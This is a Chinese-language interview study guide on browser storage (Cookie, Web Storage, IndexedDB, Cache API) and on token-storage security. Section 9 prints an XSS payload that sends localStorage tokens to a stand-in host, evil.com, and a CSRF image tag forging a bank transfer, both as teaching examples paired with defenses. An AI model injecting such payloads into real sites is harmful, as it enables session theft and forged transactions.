# 浏览器本地存储

> 面试频率：⭐⭐⭐⭐⭐ | 覆盖：Cookie、localStorage / sessionStorage、IndexedDB、Cache API、选型与安全

## 面试回答（开口版）

如果面试官问「浏览器的本地存储有哪些」，可以这样回答：

> 浏览器本地存储主要有四代方案。**Cookie** 是最早的，约 4KB，特点是**每次请求自动携带**，适合存登录凭证，配合 HttpOnly 防 XSS、SameSite 防 CSRF。**Web Storage** 包括 localStorage 和 sessionStorage，各约 5MB，API 简单，区别在生命周期——前者永久、后者标签页关闭即销毁。**IndexedDB** 是浏览器端的 NoSQL 数据库，容量大（数百 MB 起）、支持索引和事务、异步 API，适合离线应用和大列表缓存。再配合 Service Worker 的 **Cache API** 可以缓存 HTTP 响应，是 PWA 离线方案的核心。选型上一句话：随请求走用 Cookie、简单键值用 localStorage、结构化大数据用 IndexedDB、离线资源用 Cache。至于 token 存哪——localStorage 怕 XSS、HttpOnly Cookie 怕 CSRF，关键是配套防御。

**答题要点：** 四代方案各自定位 -> 容量/生命周期/携带方式 -> 选型口诀 -> token 存储权衡

## 一、本地存储全景图

```text
浏览器本地存储
|
+-- Cookie ------------------ ~4KB, 每次请求自动携带, 可设过期
|                              定位: 身份凭证(随请求走)
|
+-- Web Storage
|     +-- localStorage ------- ~5MB, 永久保存
|     |                        定位: 长期键值(主题/设置/token)
|     +-- sessionStorage ------ ~5MB, 标签页关闭即销毁
|                              定位: 临时数据(一次性表单)
|
+-- IndexedDB ---------------- 数百MB+, NoSQL, 事务/索引/异步
|                              定位: 结构化大数据(离线应用)
|
+-- Cache API ---------------- 配合 Service Worker 缓存 HTTP 响应
|                              定位: PWA 离线资源
|
+-- (已淘汰) WebSQL / userData -- 不用了解
```

**一句话选型：随请求走用 Cookie、简单键值用 localStorage、结构化大数据用 IndexedDB、离线资源用 Cache。**

## 二、Cookie：随请求走的身份凭证

### 2.1 工作流程图

```text
1. 首次登录:
   浏览器 -- 账号密码 --> 服务器
   浏览器 <-- Set-Cookie: token=abc; HttpOnly; SameSite=Lax -- 服务器
   (浏览器把 Cookie 存到本地)

2. 之后每次请求同站资源:
   浏览器 -- Cookie: token=abc (自动携带在请求头) --> 服务器
   (不用前端写任何代码, 浏览器自动带上)

3. 服务器验证 Cookie -> 识别用户身份
```

### 2.2 核心属性（面试逐个能讲）

| 属性 | 作用 | 示例 |
| --- | --- | --- |
| `Expires` / `Max-Age` | 过期时间 / 有效秒数；都不设 = 会话 Cookie（关浏览器就没） | `Max-Age=604800` |
| `Domain` | 哪些域名携带（含子域） | `Domain=a.com` |
| `Path` | 哪些路径携带 | `Path=/api` |
| `Secure` | 仅 HTTPS 传输 | |
| `HttpOnly` | **JS 不可读取**，防 XSS 偷 Cookie | `document.cookie` 拿不到 |
| `SameSite` | 跨站请求是否携带，防 CSRF | `Strict` / `Lax` / `None` |

### 2.3 两个安全属性的防御原理图

```text
HttpOnly 防 XSS 偷 Cookie:

  攻击者注入脚本: document.cookie   -> 想偷 token
  HttpOnly 设置后: JS 完全读不到      -> 偷不到 ✅


SameSite 防 CSRF:

  用户已登录 bank.com (Cookie 已存)
  恶意网站诱导浏览器向 bank.com/transfer 发请求
  |  无 SameSite: Cookie 自动带上 -> 转账成功 😱
  |  SameSite=Lax: 跨站请求不带 Cookie -> 请求无效 ✅
```

### 2.4 SameSite 三个值

| 值 | 行为 | 安全性 |
| --- | --- | --- |
| `Strict` | 完全不带跨站请求 | 最安全，但跳转过来也丢登录态 |
| `Lax`（现代默认） | 顶级导航 GET 携带，其他跨站不带 | 平衡，推荐 |
| `None` | 跨站也带 | 必须配 `Secure`，旧跨站场景 |

### 2.5 操作方式与局限

```js
// 写（原字符串操作，很原始）
document.cookie = 'name=小明; Max-Age=604800; Path=/'

// 读：拿到的是全部 cookie 的字符串，要自己拆
console.log(document.cookie) // 'name=小明; token=abc'
```

局限：容量小（~4KB）、每次请求自动携带浪费流量、字符串 API 难用。

## 三、Web Storage：localStorage / sessionStorage

### 3.1 基本用法（API 相同）

```js
localStorage.setItem('theme', 'dark')
localStorage.getItem('theme')   // 'dark'
localStorage.removeItem('theme')
localStorage.clear()
```

### 3.2 生命周期对比图（核心区别）

```text
localStorage:
  写入 ---------> 永久保存 ---------> 直到手动删除
  关浏览器还在 / 重启电脑还在 / 同源所有标签页共享

sessionStorage:
  写入 --> 标签页存活期间有效 --> 标签页关闭, 立即销毁
  复制标签页会复制 / 新开标签页不共享(各自独立)
```

### 3.3 storage 事件：多标签页通信的原理

```text
标签页A: localStorage.setItem('count', 1)
                       |
                       v 浏览器广播
标签页B: window.addEventListener('storage', e => { ... })  ✅ 收到
标签页A: 自己不会收到 ❌ (高频坑!)
```

```js
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, '->', e.newValue)
})
```

### 3.4 容量检测（加分项）

```js
// 查询当前源已用/总配额（含 IndexedDB 等）
const { usage, quota } = await navigator.storage.estimate()
console.log((usage / 1024 / 1024).toFixed(2), 'MB /', (quota / 1024 / 1024).toFixed(0), 'MB')
```

## 四、IndexedDB：浏览器里的数据库

### 4.1 为什么需要它

localStorage 的三大痛点，IndexedDB 全解决：

| localStorage 的痛点 | IndexedDB 的方案 |
| --- | --- |
| ~5MB 太小 | 数百 MB 甚至更多 |
| 只能存字符串 | 直接存对象、ArrayBuffer、File/Blob |
| 同步 API 会卡 UI | 异步 API（Promise / 事件） |

### 4.2 概念图（类比数据库）

```text
IndexedDB
|
+-- 数据库 (database, 每个域名多个)
     |
     +-- 对象仓库 (objectStore, 类比"表")
          |    主键: id (类比主键索引)
          |
          +-- 索引 (index, 类比字段索引, 可按非主键查询)
          |
          +-- 记录: { id: 1, name: '小明' } (直接存对象)

所有读写都要包在 事务(transaction) 里:
  事务保证一批操作要么全成功、要么全回滚
```

### 4.3 基本用法示例

```js
// 1. 打开数据库（版本号升级时触发 onupgradeneeded 建表）
const request = indexedDB.open('myDB', 1)

request.onupgradeneeded = (e) => {
  const db = e.target.result
  // 建对象仓库，主键为 id
  const store = db.createObjectStore('users', { keyPath: 'id' })
  // 建索引：按 name 查
  store.createIndex('nameIndex', 'name')
}

request.onsuccess = (e) => {
  const db = e.target.result

  // 2. 写入（必须在事务中）
  const tx = db.transaction('users', 'readwrite')
  tx.objectStore('users').put({ id: 1, name: '小明' })

  // 3. 按索引查询
  const readTx = db.transaction('users', 'readonly')
  readTx.objectStore('users')
    .index('nameIndex')
    .get('小明')
    .onsuccess = (e) => console.log(e.target.result) // { id: 1, name: '小明' }
}
```

### 4.4 适用场景

离线应用（先读本地库再同步）、大列表本地缓存（分页数据）、草稿箱、配合 Service Worker 做 PWA。

## 五、Cache API：PWA 的离线基石

Service Worker 配合 Cache API 可以把 **HTTP 响应本身**（含 body）存起来，离线时直接返回：

```text
有网时:
  请求 -> Service Worker 拦截 -> 先查 Cache
       |-- 命中且允许 -> 直接返回缓存的响应(离线也能用)
       |-- 未命中 -> 走网络 -> 成功后写进 Cache

无网时:
  请求 -> Service Worker 拦截 -> Cache 命中 -> 返回 ✅ (离线可用)
```

```js
// Service Worker 中预缓存资源
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open('app-v1').then((cache) => cache.addAll(['/ ', '/app.js', '/logo.png'])))
})

// 拦截请求：缓存优先
self.addEventListener('fetch', (e) => {
  e.respondWith(caches.match(e.request).then((res) => res || fetch(e.request)))
})
```

与 HTTP 缓存的区别：Cache API 是**代码可控**的编程式缓存（能自定义策略），HTTP 缓存由浏览器按响应头自动管理。

## 六、四种存储对比总表（必背）

| 特性 | Cookie | localStorage | sessionStorage | IndexedDB | Cache API |
| --- | --- | --- | --- | --- | --- |
| 容量 | ~4KB | ~5MB | ~5MB | 数百MB+ | 数百MB+ |
| 生命周期 | 可设置过期 | 永久 | 标签页级 | 永久 | 手动管理 |
| 随请求携带 | **自动携带** | 否 | 否 | 否 | 否 |
| 数据类型 | 字符串 | 字符串 | 字符串 | 对象/Blob/文件 | HTTP 响应 |
| API | 字符串 | 同步键值 | 同步键值 | 异步+事务 | 异步 |
| 典型场景 | 登录凭证 | 主题/token | 临时表单 | 离线/大缓存 | PWA 离线 |

## 七、存储选型决策图

```text
要存什么?
  |
  +-- 需要每次请求自动带? -----> Cookie (配 HttpOnly + SameSite)
  |
  +-- 简单键值对?
  |     +-- 要长期保存? -------> localStorage (主题/设置)
  |     +-- 临时用完即弃? -----> sessionStorage (表单草稿)
  |
  +-- 大量结构化数据? ---------> IndexedDB (列表/离线库)
  |
  +-- 缓存 HTTP 资源/离线? ----> Cache API (配合 Service Worker)
```

## 八、实战：Token 存哪？（高频追问）

### 方案一：localStorage

```text
登录 -> token 存 localStorage -> 请求手动带 Authorization 头

✅ 简单 / 跨标签页共享 / 天然防 CSRF(不自动携带)
❌ XSS 注入脚本即可偷走 token (脚本能读 localStorage)
```

### 方案二：HttpOnly Cookie

```text
登录 -> 服务器 Set-Cookie (HttpOnly + Secure + SameSite=Lax)
之后请求自动携带

✅ JS 读不到, XSS 偷不走 / 请求自动带
❌ 需要防 CSRF (SameSite) / 跨域 Cookie 配置麻烦
```

**面试标准回答**：两种方案各有安全对手——localStorage 怕 XSS、Cookie 怕 CSRF；没有绝对正确，**配套防御比选哪个更重要**：选 localStorage 就严格防 XSS（CSP、输出转义），选 Cookie 就上 HttpOnly + Secure + SameSite。

## 九、安全与隐私：两条攻击链

### 9.1 XSS 偷 localStorage 的攻击链

```text
评论框没转义 -> 攻击者提交 <script>fetch('evil.com?token='+localStorage.getItem('token'))</script>
  -> 其他用户浏览评论 -> 脚本执行 -> token 被发到攻击者服务器

防御: 输出转义 / CSP 内容安全策略 / token 改放 HttpOnly Cookie
```

### 9.2 CSRF 携带 Cookie 的攻击链

```text
用户已登录 bank.com -> 恶意网站隐藏 <img src="bank.com/transfer?to=bad&amount=1000">
  -> 浏览器发请求自动带上 Cookie -> 服务器以为是用户操作

防御: SameSite Cookie / CSRF Token / 关键操作二次验证
```

## 十、高频面试题速答

| 问题 | 参考答案 |
| --- | --- |
| 浏览器本地存储有哪些？ | Cookie、localStorage、sessionStorage、IndexedDB、Cache API |
| Cookie 和 localStorage 核心区别？ | Cookie 4KB 随请求自动带；localStorage 5MB 不带、永久保存 |
| Cookie 怎么防 XSS？ | HttpOnly 让 JS 读不到 |
| Cookie 怎么防 CSRF？ | SameSite 限制跨站携带 |
| token 存哪更好？ | localStorage 怕 XSS、Cookie 怕 CSRF；配套防御比选哪个重要 |
| 多标签页怎么同步登录态？ | localStorage + storage 事件（改的那页自己不收） |
| localStorage 能存对象吗？ | 只能字符串，对象要 JSON.stringify |
| IndexedDB 是什么？ | 浏览器端 NoSQL：大容量、直接存对象、索引、事务、异步 |
| IndexedDB 的事务是什么？ | 一批操作要么全成功要么全回滚，保证数据一致性 |
| Cache API 和 HTTP 缓存区别？ | Cache 是代码可控的编程式缓存；HTTP 缓存由浏览器按响应头自动管理 |
| 怎么查存储配额？ | `navigator.storage.estimate()` |
| 什么时候用 IndexedDB 而不是 localStorage？ | 数据大（>5MB）、结构化、需要查询和离线同步 |
| XSS 是什么？三种类型？ | 注入脚本执行；存储型（危害最大）、反射型（URL 回显）、DOM 型（innerHTML） |
| XSS 怎么防？ | 输出转义、textContent 代替 innerHTML、CSP、HttpOnly Cookie |
| CSRF 是什么？ | 借用户已登录的 Cookie 身份，诱导浏览器发跨站请求执行操作 |
| CSRF 怎么防？ | SameSite Cookie、CSRF Token、验证 Origin/Referer、二次验证 |
| XSS 和 CSRF 的本质区别？ | XSS 能读数据（脚本在页面里）；CSRF 读不到响应但副作用已发生 |

## 十一、速记卡

```text
1. 四代存储: Cookie(凭证) -> WebStorage(键值) -> IndexedDB(数据库) -> Cache(离线)
2. Cookie 4KB 自动带；localStorage 5MB 永久；sessionStorage 5MB 标签页级
3. Cookie 安全三件套: HttpOnly + Secure + SameSite
4. storage 事件: 改的那页自己不收
5. IndexedDB: 大容量 + 存对象 + 索引 + 事务 + 异步
6. Cache API + Service Worker = PWA 离线
7. token 选型: 怕啥配啥——XSS 配 CSP, CSRF 配 SameSite
```
